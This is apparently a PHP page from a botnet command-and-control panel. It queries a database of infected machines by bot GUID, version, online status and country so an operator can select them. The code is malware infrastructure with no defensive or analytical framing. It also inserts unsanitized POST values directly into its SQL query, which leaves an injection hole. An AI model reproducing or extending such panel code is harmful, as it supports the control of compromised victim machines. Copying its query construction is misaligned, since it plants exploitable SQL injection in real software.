<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/geo.php";
	if( !$user->Check() ) exit;

	if( isset($_POST['bot_guid']) && isset($_POST['limit']) )
	{
		$bot_guid = $_POST['bot_guid'];
		$limit = (int)$_POST['limit'];
		
		if( isset($_POST['onlyonline']) ) $sqlp2 = " AND status_bot='online' "; else $sqlp2 = "";
		if( isset($_POST['bot_ver']) && strlen($_POST['bot_ver']) > 0)
		{
			$bot_ver = $_POST['bot_ver'];
			$sqlp2 .= " AND ver_bot like '%$bot_ver%' ";
		}
		
		if( isset($_POST['fk_country']) )
		{
			$sqlp3 = " AND ( FALSE ";
			foreach($_POST['fk_country'] as $key=>$value) $sqlp3 .= "  OR country_t.id_country = $key";
			$sqlp3 .= " )";
		}
		else
		{
			$sqlp3 = '';
		}
		$sql = "SELECT guid_bot, id_bot, name_country FROM bots_t, city_t, country_t WHERE guid_bot LIKE '%$bot_guid%' 
				AND bots_t.fk_city_bot = city_t.id_city AND country_t.id_country = city_t.fk_country_city 
				$sqlp2 $sqlp3 LIMIT $limit";

		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			$RES = array();
			$countries = GetCountries();
			while( $row = $res->fetch_array() )
			{
				$cname = $row['name_country'];
				$cc = $countries[$cname];
				$row['CCODE'] = $cc;
				$RES[] = $row;
			}
			$smarty->assign('BOTS', $RES);
		}
	}
	$smarty->display("select_bots.tpl");
?>